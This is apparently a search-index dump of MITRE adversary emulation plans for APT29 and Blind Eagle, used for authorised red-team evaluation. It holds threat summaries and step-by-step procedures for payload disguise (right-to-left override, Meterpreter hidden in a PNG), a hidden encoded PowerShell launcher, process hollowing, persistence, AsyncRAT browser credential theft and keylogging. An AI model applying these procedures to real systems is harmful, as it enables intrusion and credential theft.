Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Resources","p":["Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is malware."]}],[{"l":"Scenario 1","p":["See for additional information."]}],[{"l":"Payload configs"},{"l":"Create Scenario 1 Payloads"},{"i":"1-cosmicduke-payload-cod3aka3scr","l":"1. CosmicDuke Payload (cod.3aka3.scr)","p":["alt text","cod.3aka3.scr","Description","Filename","Generate a Pupy-EC4 callback payload:","Location","Move cursor to beginning of filename. Press \"ctrl-v\" to paste RTLO character, and hit \"enter\" to save the rename.","On Windows attack platform, rename cod.3aka3.scr with right-to-left override character ( https://redcanary.com/blog/right-to-left-override/)","payloads/cod.3aka3.scr","Portable executable that uses right-to-left override character to disguise file extension","Right click cod.3aka3.scr, then click \"Rename\"","Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/","Scroll to the RTLO character (U+202E)","Select the RTLO character, then click \"select\", then click \"copy\"","The file should now be named \"rcs.3aka3.doc\"","Windows key and type 'Character Map'; select open"]},{"i":"2-privilege-escalation-payload-monkeypng","l":"2. Privilege Escalation Payload (monkey.png)","p":["Filename","Location","Description","monkey.png","payloads/monkey.png","Well formed PNG with embedded PowerShell-Meterpreter callback","Steps to re-create:","Generate a PowerShell-formatted Meterpreter payload:","Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage):"]},{"i":"3-startup-folder-payload-strings64hostuiexe","l":"3. Startup Folder Payload (strings64/hostui.exe)","p":["Filename","Location","Description","strings64.exe","payloads/SysinternalsSuite/strings64.exe","Launches Meterpreter using CreateProcessWithToken API call","Generate PowerShell-formatted Meterpreter:","Copy the PowerShell 1-liner to clipboard. Your clipboard should look like:","powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa=","Do not copy the execution preamble (%COMSPEC% /b /c start /b /min)","Open payloads/readme.txt; paste the PowerShell-Meterpreter blog on line 816. This line should look like:","$javasvc = powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa="]},{"i":"4-persistent-service-payload-javamtsupexe","l":"4. Persistent Service Payload (javamtsup.exe)","p":["Filename","Location","Description","javamtsup.exe","payloads/SysinternalsSuite/javamtsup.exe","Reverse HTTPS Meterpreter service executable","Generate a Meterpreter service-binary:"]},{"i":"5-seaduke-payload-pythonexe","l":"5. SeaDuke Payload (python.exe)","p":["Filename","Location","Description","python.exe","payloads/Seaduke/python.exe","Python Meterpreter compiled to EXE with PyInstaller","Generate python-formatted Meterpreter:","Transfer python.py to Windows attack platform","Compile python.py into a portable executable using PyInstaller ( https://pypi.org/project/PyInstaller/)","Pack the python.exe payload using UPX ( https://github.com/upx/upx)"]}],[{"l":"Scenario 2","p":["See for additional information."]}],[{"l":"APT29 Intelligence Summary"},{"i":"attck-group-id-g0016","l":"ATT&CK Group ID: G0016"},{"i":"associated-groups-yttrium-the-dukes-cozy-bear-cozyduke","l":"Associated Groups: YTTRIUM, The Dukes, Cozy Bear, CozyDuke","p":["Objectives: APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives align with the interests of the Russian Federation. 1, 14 The group is reported to have been operating as early as 2008 and may have logged operational successes as recently as 2020. APT29's objective over time and across a diverse target set appears to have been the exfiltration of information that could be used to inform strategic decision making. 1","Target Industries: APT29 operations have been directed against government agencies, embassies, political parties, defense contractors, non-governmental organizations, law enforcement, media, pharmaceutical companies, and think tanks. Geographically, APT29 has aggressed targets in the United States, Germany, Uzbekistan, South Korea, Turkey, Uganda, Poland, Chechnya, Georgia, Kazakhstan, Kyrgyzstan, Azerbaijan, Uzbekistan, Czech Republic, Belgium, Portugal, Romania, Ireland, and Hungary. 1, 8, 11, 12, 15, 16","Operations: In terms of operational tradecraft, APT29 is distinguished by their commitment to stealth and use of sophisticated techniques. APT29 is reported to have exploited zero-day vulnerabilities and has pursued actions on the objective using suites of custom malware, coupled with alternate execution methods such as PowerShell and WMI. APT29 has also been known to employ various operational cadences (smash-and-grab vs. slow-and-deliberate) depending on the target's perceived intelligence value. 1","APT29 is reported to have attained initial access by exploiting public-facing applications ( T1190), phishing ( T1566.001, T1566.002), and supply chain compromise ( T1195). The group is reported to have implemented at least two operational cadences, smash-and-grab and slow-and-deliberate. Different suites of tools and TTPs were employed for each one of these cadences. If a target was determined to be of value, the attackers are reported to have modified TTPs, and deployed a stealthier toolset with the intent or establishing long-term persistent access. 1","The objective of smash-and-grab operations appears to have been rapid collection and exfiltration. 1 As such, soon after achieving an initial foothold, APT29 actors are reported to have performed host-based situational awareness checks, and immediately sought to collect and exfiltrate data. If the host was determined to be of value, a stealth toolkit was deployed and persisted. The attackers are reported to have moved through the network, exfiltrating data and persisting on hosts deemed to be valuable. 1","In their smaller more targeted campaigns, APT29 has utilized a different toolset incrementally modified to attempt to evade published intelligence about their operations. 1"]},{"i":"apt29-attck-navigator","l":"APT29 ATT&CK Navigator"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-apt29-as-referenced-by-mitre-attck","l":"The following behaviors are in scope for an emulation of actions attributed to APT29 as referenced by MITRE ATT&CK","p":["/Attack_Layers/APT29_Scenario1.png"]},{"l":"Scenario 1"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-apt29-as-implemented-in-scenario-1-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to APT29, as implemented in Scenario 1, in the referenced reporting","p":["/Attack_Layers/APT29_Scenario1.png"]},{"l":"Scenario 2"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-apt29-as-implemented-in-scenario-2-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to APT29, as implemented in Scenario 2, in the referenced reporting","p":["/Attack_Layers/APT29_Scenario2.png"]},{"l":"CosmicDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-cosmicduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using CosmicDuke, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/CosmicDuke_S0050.png"]},{"l":"MiniDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-miniduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using MiniDuke, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/MiniDuke_S0051.png"]},{"l":"SeaDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-seaduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using SeaDuke, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/SeaDuke_S0053.png"]},{"l":"CozyCar"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-cozycar-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using CozyCar, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/CozyCar_S0046.png"]},{"l":"HammerToss"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-hammertoss-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using HammerToss, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"PowerDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-powerduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using PowerDuke, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"POSHSPY"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-poshspy-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using POSHSPY, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"CloudDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-cloudduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using CloudDuke, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"Software","p":["A Cobalt Strike beacon was used in a suspected APT29 phishing campaign. 8","APT29 appears to have used SeaDuke as a secondary backdoor and to target both Windows and Linux systems. 1","APT29 has delivered PowerDuke through malicious document macros.","APT29 has used CloudDuke as a backdoor to execute remote commands. 1","APT29 has used CosmicDuke to perform information gathering and data exfiltration. 1","APT29 has used CozyDuke to download Mimikatz, along with script files to execute Mimikatz. 1","APT29 has used CozyDuke to download PsExec, along with script files to execute PsExec. 1","APT29 has used GeminiDuke to collect victim computer configuration information. 1","APT29 has used HammerDuke to leave persistent backdoors on compromised networks. C2 communication has occurred over HTTP(S) as well as through Twitter. 1","APT29 has used MiniDuke as a backdoor to remotely execute commands on compromised systems. 1","APT29 has used OnionDuke to steal credentials, gather information, and perform denial of service attacks. 1","APT29 has used PinchDuke to steal information such as system configuration information, user credentials, and user files. 1","APT29 has used POSHSPY as a secondary backdoor that uses PowerShell and Windows Management Instrumentation.","APT29 has used SDelete to attempt to cover their tracks. 5","APT29 has used spear-phishing to infect victims with CozyCar and has used it to gather initial information on victims to determine which ones to continue pursuing further with a different tool. 1","APT29 has used the Meek plugin for Tor to hide traffic. 5","APT29 has used TOR to hide their remote access. 5","Associated Names","Availability","Backdoor","Backdoor, Downloader","CloudDuke ( S0054)","Cobalt Strike ( S0154)","Commercial","CosmicDuke ( S0050)","CozyCar ( S0046)","CozyDuke, CozyBear, Cozer, EuroAPT","Downloader, Loader, Backdoor","Emulation Notes","GeminiDuke ( S0049)","HammerDuke, NetDuke","HAMMERTOSS ( S0037)","Information Stealear","Information Stealer","Malware Toolset","meek ( S0175)","Mimikatz ( S0002)","MiniDionis, CloudLook","MiniDuke ( S0051)","Modular Malware Platform","Name","OnionDuke ( S0052)","Openly Available","PinchDuke ( S0048)","POSHSPY ( S0150)","PowerDuke ( S0139)","Proxy Tool","PsExec ( S0029)","Remote Execution","SDelete ( S0195)","SeaDaddy, SeaDesk","SeaDuke ( S0053)","Secure Delete Application","Software Type","Threat Emulation Software","TinyBaron, BotgenStudios, NemesisGemina","Tor ( S0183)","Tor Plugin","Windows Credential Dumper"]},{"l":"References","p":["\"Forkmeiamfamous\": Seaduke, latest weapon in the Duke armory","1","10","11","12","13","14","15","16","2","3","4","5","6","7","8","9","Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers","April 2015","April 2017","CISA/ FBI","COSMICDUKE: Cosmu with a twist of MiniDuke","CrowdStrike","Crowdstrike's work with the Democratic National Committee: Setting the record straight","Date","December 2016","December 2018","DerbyCon: No Easy Breach","Dissecting One of APT29âs Fileless WMI and PowerShell Backdoors (POSHSPY)","F-Secure","February 2013","FireEye","GRIZZLY STEPPE - Russian Malicious Cyber Activity","HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group","ID","January 2015","January 2019","July 2014","July 2015","June 2016","Kaspersky","Microsoft","Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign","November 2016","November 2018","Palo Alto","PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs","Publisher","SentinelOne","September 2016","September 2017","Source","State of the Hack S2E01: #NoEasyBreach REVISITED","Symantec","The CozyDuke APT","The Dukes: 7 Years of Russian Cyberespionage","The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor","This Intelligence Summary summarizes 16 publicly available sources, as well as the results of an open call for contributions. The following organizations participated in the community cyber threat intelligence contribution process:","Unit 42 Technical Analysis: Seaduke","VirusTotal","VirusTotal Submission 2f39dee2ee608e39917cc022d9aae399959e967a2dd70d83b81785a98bd9ed36","Volexity"]}],[{"l":"APT29 Operations Flow","p":["Please see the formal APT29 Intelligence Summary which includes a break-down of the cited intelligence used for each step of this emulation.","/Emulation_Plan/OpFlow_Diagram.png"]},{"l":"Scenario 1","p":["Based on CosmicDuke, MiniDuke, SeaDuke/SeaDaddy, CozyDuke/CozyCar, and HAMMERTOSS","This scenario begins with a legitimate user clicking on a malicious payload delivered via a \"spray and pray\" spearphishing campaign. The attacker immediately kicks off a \"smash-and-grab\", rapid espionage mission, gathering and exfiltrating data. After initial exfiltration, the attacker realizes the value of the victim and subsequently deploys a stealthier toolkit, changing TTPs and eventually moving laterally through the rest of the environment. The scenario ends with the execution of previously established persistence mechanisms.","The content to execute this scenario was tested and developed using Pupy, Meterpreter, and other custom/modified scripts and payloads. Pupy and Meterpreter were chosen based on their available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"l":"Scenario 2","p":["Based on PowerDuke, POSHSPY, CloudDuke, and more recent (2016-2018) TTPs","This scenario begins with a legitimate user clicking on a malicious payload delivered via a targeted spearphishing campaign. The attacker employs a methodical approach to compromising the initial target, establishing persistence, gathering credential material, then finally enumerating and compromising the entire domain. Data is exfiltrated to attacker controlled cloud storage. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","The content to execute this scenario was tested and developed using PoshC2 and other custom/modified scripts and payloads. PoshC2 was chosen based on its available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]}],[{"l":"Change Log"},{"l":"APT29 Emulation Plan","p":["Version","Date","Change Details","0.1","21 April 2020","ATT&CK Evaluations Release","1.0","21 January 2021","ATTACK Evaluations Library Release"]}],[{"l":"Blind Eagle","p":["License","This repo contains the source code used to support the MITRE Engenuity's ATT&CK Evaluation team's 2023 BlackHat presentation \uD83C\uDFA9 , Becoming a Dark Knight: Adversary Emulation Demonstration for ATT&CK Evaluations. Using the Latin American threat actor known as Blind Eagle, the presentation provides an example of how our team develops adversary emulation plans and source code for MITRE Engenuity's ATT&CK Evaluation. This presentation is a point-in-time reference for our process which is constantly evolving.","Based on open-source intelligence, the ATT&CK Evaluation team created the below scenario leveraging techniques seen from Blind Eagle in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83D\uDE48 \uD83E\uDD85","p":["Blind Eagle (APT-C-36, Ãguila Ciega, ATT&CK Group G0099) is a Spanish-speaking threat actor that has been active since at least 2018. 1 The group is believed to be based in South America, given their use of regional Spanish dialects and intimate knowledge of government agencies and other local institutions in the region. Targets are focused on Colombia-based institutions, including entities in the financial, manufacturing, and petroleum sectors. 2 However, this threat actor has also executed operations against victims throughout South America, Europe, the US, and Australia. 3 4 While Blind Eagle tends to be largely opportunistic in their motives, they have conducted espionage operations as well. 5","Blind Eagle generally relies on commodity RATs, including Imminent Monitor, BitRAT, QuasarRAT, AsyncRAT, LimeRAT, and RemcosRAT. 6 7 8 This threat actor's campaigns often leverage spearphishing for initial access and the deployment of encrypted payloads. 2 Additional common TTPs used by this threat actor include: use of malicious macros, process injection, and other LOTL techniques. 5 9 The group also employs relatively strict targeting, and has been known to use link-shortening services that geolocate victims. 3"]},{"l":"Emulation Overview","p":["Software Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83D\uDC69â\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","We provide a script to manage the various methods of obfuscating and encoding payloads. This script uses flags to identify the method of obfuscation or encoding for each component of software. Each software contains a ReadMe.md with the specified flag need when executing this script. From the Resources Folder, execute the below command with the correct flag -flag identified in the software's README.md."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDC7E","p":["Asyncrat","VBS Loader","Fiber Loader","Fsociety Injector"]},{"i":"scenario-walkthrough","l":"Scenario Walkthrough \uD83E\uDDED","p":["Emulation Plan"]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Operation Flow- High-level summary of the scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"i":"acknowledgements","l":"Acknowledgements \uD83E\uDD29","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE Engenuity teams, ATT&CK Evaluation teams, the organizations and people that provided public intelligence and resources. Thank you! \uD83D\uDE4C \uD83E\uDD70"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: ctid@mitre-engenuity.org LinkedIn: https://www.linkedin.com/company/mitre-engenuity/ Twitter: https://twitter.com/MITREengenuity"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Blind Eagle Emulation Plan","p":["Red Team Playbook","CTI Operations Flow","Description","Blind Eagle Scenario","Blind Eagle Operation Flow","This contains the scenario developed for the BlackHat 2023 presentation focusing on Blind Eagles's usage of fiber.dll, fsociety.dll, and Async RAT)"]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","â - extremely important note","â¡ï¸ - Switching to another session","â­ - Sign out of something","This scenario emulates Blind Eagle TTPs based on several malware specimens either used by or associated with the Blind Eagle actors:","AsyncRAT"]},{"i":"step-0---setup","l":"Step 0 - Setup"},{"i":"overview","l":"\uD83D\uDCDC Overview","p":["This emulation leverages AsyncRAT as a C2 server, and an attacker controlled web server to host and deliver two loaders, an injector, and the final AsyncRAT payload. AsyncRAT server is a Windows .NET GUI based program and will run on an attacker controlled Windows Machine. A second Ubuntu machine will be used as attacker infrastructure - we use Python to host a simple web server with a directory structure that aligns with CTI and hosts payloads.","â This emulation plan assumes the infratructure found in setup has been completed. If this has not been done then IP addresses and URLs may change.","\uD83D\uDCA1 During the emulation the Exchange server mail.bancomurcielago.com was configured as an open relay and an email from notificacion@dian-info.com was sent with the PDF Notificacion De Pago attached from the attacker web machine using the Linux sendemail program. A corresponding DNS entry for dian-info.com was created on the Active Directory Domain Controller canario was also created so that the link contained in the PDF would resolve properly.","â If you do not wish to perform these steps downloading the payload factura-228447578537.pdf.uue from Attacker Web 192.168.0.5 to Desk1 10.1.0.5 will also suffice - you can perform the following PowerShell command from a PowerShell prompt on Desk1 during preflights:"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["\uD83D\uDCA1 RDP, do not SSH, to the Windows Attack Platform 192.168.0.4 hosting the C2 server.","Open a new terminal window and navigate to where you previously cloned the repo in setup. Start the AsyncRAT server:","Start the AsyncRAT Server:","â¡ï¸ Open a second PowerShell window on your Windows Attack Platform and SSH to the Web Server 192.168.0.5 to ensure the following four malicious files are in the web, Rump, and dll directories for your user:","\uD83D\uDCA1 These files are all part of the Blind Eagle phishing and attack chain and will be served from attacker infrastructure.","factura-228447578537.pdf.uue in web","new_rump_vb.net.txt in web/dll","Rump.xls in web/Rump","asy.txt in web","Check the file exists:","\uD83D\uDCA1 If the armed and zipped file is not there, follow the instructions for creating it then copy the zip file to ~/web.","Start the Python Web Server in a TMUX session (this ensures if your SSH connection drops the web server will still run):"]},{"i":"step-1---initial-compromise-and-persistence","l":"Step 1 - Initial Compromise and Persistence"},{"i":"overview","l":"\uD83D\uDCDC Overview","p":["Step 1 emulates Blind Eagle gaining initial access from the target user downloading, extracting, and executing a Visual Basic script received from a link residing in an attachment to a spearphishing email. The email is sourced from the email address notificacion@dian-info.com the following actions take place when the VB script is executed:","The script uses PowerShell to download new_rump_vb.net.txt ( fiber.dll) from 192.168.0.5/dll.","The script then loads fiber.dll into the current Application Domain.","Once loaded the VAI method is called passing in an obfuscated URL pointing to the AsyncRAT payload ( asy.txt).","fiber.dll creates an artifact in C:\\Windows\\Temp called OneDrive.vbs which is a copy of the VB loader.","fiber.dll uses the WebClient.DownloadString method to download Rump.xls (fsociety.dll).","fiber.dll uses Strings.StrReverse and Replace to unmangle Rump.xls.","fiber.dll uses Strings.StrReverse and Replace to unmangle the URL pointing to asy.txt (AsyncRAT payload).","fiber.dll uses webClient.DownloadString and StrReverse to download and unmabgle asy.txt.","fiber.dll uses AppDomain.CurrentDomain.Load and Convert.FromBase64String to load Rump.xls (fsociety.dll) into the current Application Domain and executes the Ande method of the fsociety.Tools Class passing in two arguments: The path to RegSvcs.exe and the contents of asy.txt with Base64 encoding removed.","fsociety.dll performs process hollowing to inject AsyncRAT into RegSvcs.exe","fiber.dll calls the startup method of the fiber.Optical class. This leverages the Windows Script Host to establish persistence by creating an lnk file in the Users startup folder pointing to the previously dropped OneDrive.vbs in C:\\Windows\\Temp"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ RDP into Desk1 (10.1.0.5):","Username","Password","bancomurcielago\\demo_admin","Phrasing!","Open Edge and browse to https://mail.bancomurcielago.com/owa, login as demo_admin:","\uD83D\uDCA1 There should be an unread email from notificacion@dian-info.com.","Open this email and download the PDF attachment.","Open the PDF and click the link to download factura-228447578537.pdf.uue","Open File Explorer and navigate to the Downloads file directory.","Right click factura-228447578537.pdf.uue and use winRAR to unzip - when prompted enter the password found in the PDF email attachment","Double click the extracted factura-228447578537.pdf.vbs to execute the first stage and kick off the infection chain.","â Wait 30 seconds.","Return to your RDP session on Windows Attack Platform to ensure AsyncRAT called back","\uD83D\uDD0D The C2 server should register a new AsyncRAT callback after the script is executed."]},{"i":"reference-code-reporting","l":"\uD83D\uDD2E Reference Code & Reporting","p":["ATT&CK Technique","eagle_loader.vbs#L324-L348","Fiber Base64 Decodes and executes fsociety injector with AsyncRAT payload","Fiber copies VBS loader for persistence","Fiber downloads and unmangles Rump.xls (fsociety)","Fiber establishes persistence via lnk file in users %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup folder","Fiber prepares URL and download AsyncRAT","fiber.cs#L38-L49","fiber.cs#L52-L58","fiber.cs#L60-73","fiber.cs#L75-82","fiber.cs#L85","Fsociety Ande function for process hollowing","fsociety.cs#L68-L77","https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/","https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/","https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia https://dciber.org/analisando-asyncrat-distribuido-na-colombia/","Loader downloads and executes fiber.dll","Red Team Activity","Relevent CTI Report","Source Code Link","T1024.002 User Execution Malicious File","T1036.007 Masquerading: Masquerade File Type","T1055.012 Process Hollowing T1218.009 System Binary Proxy Execution:Regsvcs/Regasm","T1059.00[1,5] Command and Scripting Interpreter [Powershell, Visual Basic] T1105 Ingress Tool Transfer","T1105 Ingress Tool Transfer T1132.001 Data Encoding: Standard Encoding T1140 Deobfuscate/Decode Files or Information","T1105 Ingress Tool Transfer T1132.001 Data Encoding: Standard Encoding T1150 Deobfuscate/Decode Files or Information T1102 Web Service","T1132.001 Data Encoding: Standard Encoding T1150 Deobfuscate/Decode Files or Information T1055.012 Process Hollowing T1218.009 System Binary Proxy Execution:Regsvcs/Regasm","T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder","User executes factura-228447578537.pdf.vbs","VB Loader README and Instructions","vb_loader","VBS Loader Masquerades as a PDF file"]},{"i":"step-2---credential-theft","l":"Step 2 - Credential Theft"},{"i":"overview","l":"\uD83D\uDCDC Overview","p":["Step 2 emulates Blind Eagle performing browser credential theft leveraging the AsyncRAT Recovery plugin.","Blind Eagle is known to monitor the current loaded window and look for strings such as banking websites and other financial institution websites. The user has a session to a Bank website open so Blind Eagle attempts to steal both saved passwords and cookies from the browser."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ On Windows Attack Platform 192.168.0.4 bring the AsyncRAT server window into focus.","In the AsyncRAT Server window issue the following command to the AsyncRAT Client.","Right Click AsyncRAT Client - Monitoring - Password Recovery","Recovery","Once the recovery process completes review the results on the AsyncRAT server and look for credentials in the resulting txt file.","Right click AsyncRAT client - Client Management - Client - Show Folder","Show_Folder","This will open a File Explorer window with files named Cookies_date and Password_date. Open the Passwords file to verify credential collection"]},{"i":"reference-code-reporting","l":"\uD83D\uDD2E Reference Code & Reporting","p":["AsyncRAT Chromium browser account recovery Plugin","AsyncRAT Chromium browser cookie recovery","AsyncRAT FireFox browser password decryptor","AsyncRAT FireFox browser password reader","AsyncRAT FireFox cookie grabber","ATT&CK Technique","Chromium.cs#L151-L360","ChromiumCookies.cs#L43-L194","FFCookiesGrabber.cs#L29-L122","FFDecryptor.cs#L8-L95","FireFoxPassReader.cs#L12-L110","https://dciber.org/analisando-asyncrat-distribuido-na-colombia/ https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/","Red Team Activity","Relevent CTI Report","Source Code Link","T1539 Steal Web Session Cookie","T1555.003 Credentials from Password Stores: Credentials from Web Browsers","T1555.003 Credentials from Password Stores: Credentials from Web Browsers T1555.004 Credentials from Password Stores: Windows Credential Manager"]},{"i":"step-3---keylogging","l":"Step 3 - Keylogging"},{"i":"overview","l":"\uD83D\uDCDC Overview","p":["Step 3 emulates Blind Eagle using the keylogging plugin for AsyncRAT to capture credentials from the victim machine."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ On Windows Attack Platform issue the following commands to deploy the keylogger to the victim workstation:","In the AsyncRAT Server window Right click client - Monitoring - Keylogger","keylogging","A second window will open on the AsyncRAT server indicating that keylogging is running.","â¡ï¸ RDP from your workstation not the Attack Platform as demo_admin to Desk1 (this is so it does not appear that the attacker RDP'ed to the victim). On Desk1 (10.1.0.5) open an Edge browser window and navigate to web.bancomurcielago.com:8000/admin/login. Enter the username administrador-murcielagos and password N@N@N@N@Murci31@g0 to log in to the Django server.","â¡ï¸ Switch to the Windows Attack Machine, you should see the administrator username and password show up in the keylogging window indicating a successful capture of credentials.","Verify that the credentials were successfully captured by opening up a browser window and navigating to http://10.1.0.4:8000/admin/login and authenticating with the captured credentials."]},{"i":"reference-code-reporting","l":"\uD83D\uDD2E Reference Code & Reporting","p":["Red Team Activity","Source Code Link","ATT&CK Technique","Relevent CTI Report","AsyncRAT LimeLogger Plugin","packet.cs#L111-L143","T1056 Input Capture: Keylogging","https://dciber.org/analisando-asyncrat-distribuido-na-colombia/ https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/"]}],[{"l":"AsyncRAT"},{"l":"Overview","p":["AsyncRAT is an open source Remote Administration tool maintained by Nyan Cat and leveraged by Blind Eagle in its campaigns 1, 2. For the purposes of this emulation a fork of AsyncRAT was made so that documentation could be added and relevent code functions could be highlighted with comments relating to their use and CTI. AsyncRAT has a client and server written in C# and hosts a suite of capabilities. Of particular note in Blind Eagle Campaigns is the inclusion of functions that are capable of stealing cookies from the browser, keyloggers, and remote desktop interaction 3, 4, 5, 6, 7.","AsyncRAT is made up of the following components:","Component","Description","Server","AsyncRAT server executable written in .NET 4.6. GUI application that handles connections from agents and tasking","AsyncRAT Client","AsyncRAT payload delivered to victim machines. Provides built in functionality and plugin interface to extend functionality","AsnycRAT Plugins","Code that enables extra features such as keylogging 8, credential recovery 9, and remote desktop 10"]},{"l":"Usage","p":["See server and Client sections for specific usage instructions"]},{"l":"Troubleshooting"},{"l":"Build","p":[".NET 4.6 is required to buid the server. the download can be found on the Microsoft website. Once installed the computer will need to be restarted before the server can be built.","Two build options are presented. The CLI can be used with devenv.exe to build the AsyncRAT-Sharp.sln solution. Also instructions for the Visual Studio GUI are also included:"]},{"l":"CLI"},{"l":"GUI","p":["Open Solution in Visual Studio - this option is presented upon Visual Studio opening","open","asyncrat-sln","In the menu bar near the top of the window, change the dropdown from Debug to Release - this will build and remove any debugging assistance from the project:","debug->release","In the menu bar at the top of the window, select Build -> Build Solution. The completed executables will be located in birdsofprey\\Resources\\AsyncRAT-C#\\Binaries\\Release","build"]},{"l":"References and 